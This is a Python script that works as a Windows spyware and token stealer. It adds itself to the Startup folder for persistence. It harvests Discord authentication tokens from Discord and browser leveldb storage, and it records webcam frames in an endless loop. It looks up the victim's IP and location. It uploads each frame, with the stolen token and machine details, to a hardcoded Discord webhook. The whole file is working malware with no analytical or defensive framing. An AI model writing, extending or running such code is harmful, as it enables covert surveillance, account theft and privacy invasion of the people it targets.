from cv2 import CAP_PROP_BACKLIGHT
import numpy as np
import cv2 as cv
import requests
import discord
import os
import socket
import sys, re

url = "https://canary.discord.com/api/webhooks/959713244933677116/ZshGunP-yLu_VDTh5tz85tMGSVfySdTm1PlUhX8WHdPDoMOoZv9WUTJR8KatqzGr8Msk" # example webhook link
webhook = discord.Webhook.from_url(url, adapter=discord.RequestsWebhookAdapter())
cap = cv.VideoCapture(0)
cap.set(CAP_PROP_BACKLIGHT, 0)
cap.set(412, 1)
if not cap.isOpened():
    print("Cannot open camera")
    exit()
count = 0
path = fr"C:\Users\{os.environ['USERNAME']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_script.cmd"
f = open(path, "w")
f.write(f"python {os.path.dirname(os.path.realpath(sys.argv[0]))}\\buddy.py") # IF THE FILE NAME IS CHANGED, IT NEEDS TO BE CHANGED HERE TOO
f.close()
def find_tokens(path):
    path += r'\Local Storage\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def get_accounts():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Chromium': local + '\\Chromium\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
    }

    # Verify if paths exists
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        # Look for tokens in the paths
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                
                # Sends the info through the webhook
                return token
buddy = get_accounts()
print(buddy)
username = None
while True:
    ret, frame = cap.read()
    if not ret:
        print("Can't receive frame (stream end?). Exiting ...")
        break
    cv.imwrite("C:\loggedframes" + "\\frame%d.jpg" % count, frame)
    
    with open(file=f'C:\loggedframes\\frame{count}.jpg', mode='rb') as f:
        my_file = discord.File(f)
    hostname = otherip = ip = country = city = region = googlemap = "None"
    try:
        data = requests.get("https://ipinfo.io/json").json()
        ip = data['ip']
        hostname = socket.gethostname()
        otherip = socket.gethostbyname(hostname)
        city = data['city']
        country = data['country']
        region = data['region']
    except Exception:
        pass
    e = discord.Embed(title=f'{os.getlogin()}@{os.environ["COMPUTERNAME"]} FRAME {count}', description=f'INTERNAL IP: {otherip}\nPUBLIC IP: {ip}\nCITY: {city.capitalize()}\nCOUNTRY: {country}\nREGION: {region}\nTOKEN: {buddy}')
    e.set_image(url=f"attachment://frame{count}.jpg")
    webhook.send(embed=e, username="camera log by joey.#8374", file=my_file)
    count=count+1